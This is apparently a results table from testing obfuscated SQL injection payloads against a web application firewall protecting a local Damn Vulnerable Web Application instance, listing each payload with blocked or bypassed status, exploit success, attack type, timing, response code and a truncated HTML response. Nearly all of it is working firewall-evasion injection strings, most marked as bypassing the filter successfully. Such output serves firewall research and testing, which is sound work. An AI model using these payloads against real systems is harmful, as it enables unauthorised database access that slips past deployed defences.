Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@!=.1%0b||+not%0b{x+(select+1)}=1=+(not%0b{x,Bypassed,Yes,Yes (unionAtk),Unknown,0.0384,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+||%0bnot%0b{`if`+1}=1=%0b(!%0b{`if`%0b1}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0212,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or%0b!+true=%0b(not~0)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.026,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0bor+!%0b{x+(select+1)}=1=%0b(!%0b{x,Bypassed,Yes,Yes (unionAtk),Unknown,0.0754,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0b||+!+{x%0b(select%0b1)}=1=+(not%0b{x,Bypassed,Yes,Yes (unionAtk),Unknown,0.0308,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||%0b!+{x+(select+1)}=1=+(not~,Blocked,No,None,Unknown,0.0211,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27||%0b@<@.%0bor+not+{x+(select+1)}=1=%0b(not,Bypassed,Yes,Yes (unionAtk),Unknown,0.0279,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||+!+1=+(0)%0bor',Blocked,No,None,Unknown,0.017,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0bor+!+{a%0b1}=1=+(!+{a+1}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0246,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||%0bnot+{x%0b(select+1)}=1=%0b(!%0b{x,Bypassed,No,None,Unknown,0.0188,70.71,No,500,
0%27<@=1%0b||+not+{`if`+1}=1=%0b(!+{a+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0409,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+||+{x%0b(select+1)}=1+like%0b{x+(select%0b1)}=1%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0479,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor+!+{x%0b(select%0b1)}=1=%0b(not+{x,Bypassed,No,None,Unknown,0.0514,71.01,No,500,
0%27<@!=1.+or%0b!%0b{a%0b1}=1=+(not+{x+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0202,71.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or%0bnot%0b{x+(select+1)}=1=+(!+{a,Blocked,No,None,Unknown,0.0146,71.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0b||+not%7e0=%0b(!%0b{x+(select%0b1)}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0282,71.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor%0bnot+{x+(select%0b1)}=1=%0b(not+{`if`,Bypassed,No,None,Unknown,0.04,71.01,No,500,
0%27<@!=.1%0bor+not%7e0=%0b(not%0b{x+(select%0b1)}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0295,71.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or+not%0b{`if`+1}=1=+(!%0b{x%0b,Bypassed,No,None,Unknown,0.023,71.01,No,500,
0%27<@!=.1%0bor%0b!+{x+(select+1)}=1=+(!+{a,Bypassed,Yes,Yes (unionAtk),Unknown,0.0328,71.12,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0bor%0b{a+1}=1+like%0b{x+(select+1)}=1+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0154,71.24,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or%0bnot%0b{a%0b1}=1=%0b(not+{x+(select,Bypassed,Yes,Yes (unionAtk),Unknown,0.0246,71.24,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or%0bnot+{x+(select%0b1)}=1=+(false),Blocked,No,None,booleanAtk,0.0171,71.24,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+or+not+{x+(select+1)}=1=%0b(not+{x,Blocked,No,None,Unknown,0.028,71.27,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+or+not+{x+(select%0b1)}=1=%0b(not%0b,Blocked,No,None,Unknown,0.0154,71.39,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1+or+!+true=+(not~false)%0bor,Blocked,No,None,booleanAtk,0.0117,71.57,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.%0b||+!%7efalse=%0b(not~false)%0bor,Bypassed,No,None,booleanAtk,0.0276,71.57,No,500,
0%27or+@<@.%0bor+!+{x%0b(select%0b1)}=1=%0b(!,Bypassed,Yes,Yes (unionAtk),Unknown,0.0247,71.57,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or+!+true=+(!%7e0)+or,Bypassed,No,None,booleanAtk,0.0314,69.66,No,500,
0'<@=1+||%0b{a+1}=1+like+true%0b||',Blocked,No,None,Unknown,0.0106,70.1,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0bor+not%0b{x+(select+1)}=1=%0b(!+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0257,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+||%0bnot%0b1=%0b(not%0b{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0222,70.1,No,500,
0%27<@=.1%0b||+not+{`if`+1}=1=+(not+1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0258,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0bor+not%7efalse=+(not%0b{x+(select+1)}=1,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0136,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or+!%7efalse=+(false)+or',Bypassed,No,None,booleanAtk,0.0141,70.1,No,500,
0%27<@=1+||+false=+(!~0)--+,Blocked,No,None,piggyAtk,0.0147,70.1,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+||+not%0b{`if`+1}=1=%0b(!+{x%0b(select,Bypassed,Yes,Yes (unionAtk),Unknown,0.0258,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0b||+not%7efalse=%0b(not+{`if`%0b1}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0347,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0bor%0bnot+1=%0b(not%0b{x+(select%0b1)}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0246,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or%0b!%0b{`if`%0b1}=1=%0b(not+{x+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0186,70.18,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0bor%0bnot+{a%0b1}=1=+(not%0b1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0291,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
